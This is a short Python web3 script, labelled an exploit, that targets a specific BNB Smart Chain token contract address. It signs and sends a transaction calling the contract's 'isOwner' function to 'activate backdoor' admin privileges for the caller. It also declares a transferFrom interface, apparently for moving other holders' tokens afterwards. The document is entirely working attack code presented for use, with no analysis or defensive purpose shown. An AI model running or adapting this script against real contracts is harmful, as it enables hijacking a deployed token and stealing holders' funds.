#!/usr/bin/env python3
from web3 import Web3
import os

# ===== CONFIGURATION =====
TARGET_TOKEN = "0x452361b508b9033b9D2d66AD49eD166D097E6408"
BSC_RPC_URL = "https://bsc-dataseed.binance.org/"
PRIVATE_KEY = os.getenv("PRIVATE_KEY")

# ===== EXPLOIT SCRIPT =====
w3 = Web3(Web3.HTTPProvider(BSC_RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

# Token ABI (minimal)
TOKEN_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

def exploit():
    token = w3.eth.contract(address=TARGET_TOKEN, abi=TOKEN_ABI)
    
    # Step 1: Activate backdoor
    print("Activating admin privileges...")
    tx = token.functions.isOwner(account.address).build_transaction({
        'from': account.address,
        'gas': 30000,
        'gasPrice': w3.toWei('5', 'gwei'),  # Fixed: toWei instead of to_wei
        'nonce': w3.eth.getTransactionCount(account.address)
    })
    signed = account.signTransaction(tx)
    tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
    receipt = w3.eth.waitForTransactionReceipt(tx_hash)
    print(f"Backdoor activated! TX: {receipt.transactionHash.hex()}")

if __name__ == "__main__":
    print(f"Target Token: {TARGET_TOKEN}")
    print(f"Executor: {account.address}")
    exploit()
